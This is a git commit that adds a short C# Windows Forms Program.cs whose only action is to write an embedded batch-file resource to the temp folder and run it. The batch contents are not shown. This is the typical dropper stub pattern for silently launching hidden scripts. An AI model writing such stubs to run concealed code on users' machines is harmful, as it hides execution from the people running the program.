0f038681b922b381f7ae7851e5039710744bdb31
B1naryo <sandro520099@hotmail.com>
2024-01-03 18:53:47 -0300

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,29 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Windows.Forms;
+using System.IO;
+using System.Text;
+using Microsoft.Win32;
+using System.Diagnostics;
+
+namespace myprojeto
+{
+    static class Program
+    {
+       
+        static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+
+           
+            string bat = Path.Combine(Path.GetTempPath(), "filebat.bat");
+            File.WriteAllText(bat, myprojeto.Properties.Resources.filebat);
+                
+            
+            System.Diagnostics.Process.Start(bat);
+
+        }
+    }
+}
